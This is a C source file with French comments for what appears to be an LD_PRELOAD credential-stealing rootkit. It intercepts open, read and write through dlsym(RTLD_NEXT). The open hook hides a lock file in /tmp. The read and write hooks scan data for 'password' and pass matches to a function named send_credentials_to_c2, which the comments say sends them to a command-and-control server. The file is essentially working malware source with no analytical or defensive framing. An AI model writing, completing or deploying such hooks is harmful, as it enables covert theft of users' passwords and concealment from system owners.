#include "hooking.h"
#include "communication.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

#define LOCK_FILE "/tmp/.libproj_lock"

static int (*original_open)(const char *, int, ...) = NULL;
static ssize_t (*original_read)(int, void *, size_t) = NULL;
static ssize_t (*original_write)(int, const void *, size_t) = NULL;

/**
 * Interception de la fonction open pour empêcher l'accès au fichier .libproj_lock.
 */
int intercepted_open(const char *pathname, int flags, ...) {
    if (!original_open) original_open = dlsym(RTLD_NEXT, "open");
    if (strcmp(pathname, LOCK_FILE) == 0) {
        errno = EACCES; // Refuse l'accès au fichier LOCK_FILE
        return -1;
    }
    return original_open(pathname, flags);
}

/**
 * Interception de la fonction read pour surveiller les données sensibles.
 */
ssize_t intercepted_read(int fd, void *buf, size_t count) {
    if (!original_read) original_read = dlsym(RTLD_NEXT, "read");
    ssize_t bytes = original_read(fd, buf, count);
    if (bytes > 0 && strstr(buf, "password")) {
        send_credentials_to_c2((const char *)buf);  // Envoi des credentials au C2
    }
    return bytes;
}

/**
 * Interception de la fonction write pour surveiller les données sensibles.
 */
ssize_t intercepted_write(int fd, const void *buf, size_t count) {
    if (!original_write) original_write = dlsym(RTLD_NEXT, "write");
    ssize_t bytes = original_write(fd, buf, count);
    if (bytes > 0 && strstr(buf, "password")) {
        send_credentials_to_c2((const char *)buf);  // Envoi des credentials au C2
    }
    return bytes;
}
